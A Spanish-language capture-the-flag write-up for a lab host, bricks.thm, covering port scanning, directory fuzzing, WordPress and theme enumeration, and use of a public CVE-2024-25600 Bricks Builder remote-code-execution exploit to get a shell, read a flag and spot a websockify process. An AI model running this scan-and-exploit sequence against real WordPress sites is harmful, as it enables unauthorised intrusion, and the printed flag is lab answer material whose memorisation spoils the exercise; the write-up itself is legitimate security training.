primero empezamos con un escaneo, unicamente para hacer ping con los puertos: 

[davidoberst@archlinux ~]$ sudo nmap -Pn 10.64.154.95 
[sudo] password for davidoberst: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-13 22:48 -0500
Nmap scan report for 10.64.154.95
Host is up (0.072s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
3306/tcp open  mysql

con un escaneo activo, veremos que el sistema operativo es linux, corriendo en un servidor ubuntu. 
y un servidor python en el puerto 80

[davidoberst@archlinux ~]$ sudo nmap -sV -O  10.64.154.95
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http     Python http.server 3.5 - 3.10
443/tcp  open  ssl/http Apache httpd
3306/tcp open  mysql    MySQL (unauthorized)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).


vemos que hay 4 servicios abiertos,vamos a entrar al puerto 80 para ver que encontramos. 


en el sistio podemos ver un solo mensaje diciendo Brick by Brick, y una redireccion que lleva a : 

https://10.64.154.95/#brx-content

hare fuzzing en ambas urls : 


Starting gobuster in directory enumeration mode
===============================================================
Progress: 0 / 1 (0.00%)
2026/07/13 23:00:11 error on running gobuster on https://bricks.thm/: unable to connect to https://bricks.thm/: Get "https://bricks.thm/": tls: failed to verify certificate: x509: certificate has expired or is not yet valid: current time 2026-07-13T23:00:11-05:00 is after 2025-04-02T11:59:14Z


el certificado expiro, vamos a ignorar eso con el parametro -k

davidoberst@archlinux Web-Content]$ gobuster dir -u https://bricks.thm/ -w common.txt -k


obtuvimos como resultados : 


0                    (Status: 301) [Size: 0] [--> https://bricks.thm/0/]
B                    (Status: 301) [Size: 0] [--> https://bricks.thm/2024/04/02/brick-by-brick/]
S                    (Status: 301) [Size: 0] [--> https://bricks.thm/sample-page/]
admin                (Status: 302) [Size: 0] [--> https://bricks.thm/wp-admin/]
atom                 (Status: 301) [Size: 0] [--> https://bricks.thm/feed/atom/]
b                    (Status: 301) [Size: 0] [--> https://bricks.thm/2024/04/02/brick-by-brick/]
br                   (Status: 301) [Size: 0] [--> https://bricks.thm/2024/04/02/brick-by-brick/]
dashboard            (Status: 302) [Size: 0] [--> https://bricks.thm/wp-admin/]
embed                (Status: 301) [Size: 0] [--> https://bricks.thm/embed/]
favicon.ico          (Status: 302) [Size: 0] [--> https://bricks.thm/wp-includes/images/w-logo-blue-white-bg.png]
feed                 (Status: 301) [Size: 0] [--> https://bricks.thm/feed/]
index.php            (Status: 301) [Size: 0] [--> https://bricks.thm/]
login                (Status: 302) [Size: 0] [--> https://bricks.thm/wp-login.php]
page1                (Status: 301) [Size: 0] [--> https://bricks.thm/]
phpmyadmin           (Status: 301) [Size: 238] [--> https://bricks.thm/phpmyadmin/]
rdf                  (Status: 301) [Size: 0] [--> https://bricks.thm/feed/rdf/]
render/https://www.google.com (Status: 301) [Size: 0] [--> https://bricks.thm/render/https:/www.google.com]
render?url=https://www.google.com (Status: 301) [Size: 0] [--> https://bricks.thm/render%3Furl=https:/www.google.com]
robots.txt           (Status: 200) [Size: 67]
rss2                 (Status: 301) [Size: 0] [--> https://bricks.thm/feed/]
rss                  (Status: 301) [Size: 0] [--> https://bricks.thm/feed/]
sa                   (Status: 301) [Size: 0] [--> https://bricks.thm/sample-page/]
sam                  (Status: 301) [Size: 0] [--> https://bricks.thm/sample-page/]
s                    (Status: 301) [Size: 0] [--> https://bricks.thm/sample-page/]
sample               (Status: 301) [Size: 0] [--> https://bricks.thm/sample-pag

wp-admin             (Status: 301) [Size: 236] [--> https://bricks.thm/wp-admin/]
wp-content           (Status: 301) [Size: 238] [--> https://bricks.thm/wp-content/]
wp-includes          (Status: 301) [Size: 239] [--> https://bricks.thm/wp-includ



al abrir la url /deed/atom, descargs un archivo xml, al leerlo contiene esto : 

<entry>
		<author>
			<name>administrator</name>
							<uri>http://localhost:8000</uri>
						</author>


<generator uri="https://wordpress.org/" version="6.5">WordPress</generator> 


podemos ver un nombre de usario, tal vez, y una version de wordpress, 

ademas de un login de phpmyyadmin : 

https://bricks.thm/phpmyadmin/


otra ulr donde encontramos un buscador : https://bricks.thm/?s=


hare un escano con wpscan : 

[davidoberst@archlinux Web-Content]$ wpscan --url https://bricks.thm/ --disable-tls-checks -e vp,vt,u


vemos que esta usando un tema : 

[+] WordPress theme in use: bricks
 | Location: https://bricks.thm/wp-content/themes/bricks/
 ...
 | Version: 1.9.5 (80% confidence)


bingo, en internet al buscar esa version de bricks encontramos 

CVE-2024-25600 - WordPress Bricks Builder Remote Code Execution (RCE) 


encontre un cve en github 

https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT/blob/main/CVE-2024-25600.py


el cual me permitio acceder a una shell 

(.venv) [davidoberst@archlinux cve]$ python3 CVE-2024-25600.py -u https://bricks.thm/



Shell> whoami
apache



ecnontre una bandera : 

Shell> cat 650c844110baced87e1606453b93f22a.txt
THM{fl46_650c844110baced87e1606453b93f22a}

Shell> 


una de las preguntas del reto es, What is the service name affiliated with the suspicious process? 

asi que eso me dio una pista de que hacer, al usar 

Shell> ps aux 


revise los procesos y pude ver 



root        1627  0.0  0.5 121120 22392 ?        S    04:43   0:02 python3 -m websockify 80 localhost:5901 -D


redirige el puerto 80 a un puerto VNC interno 5901
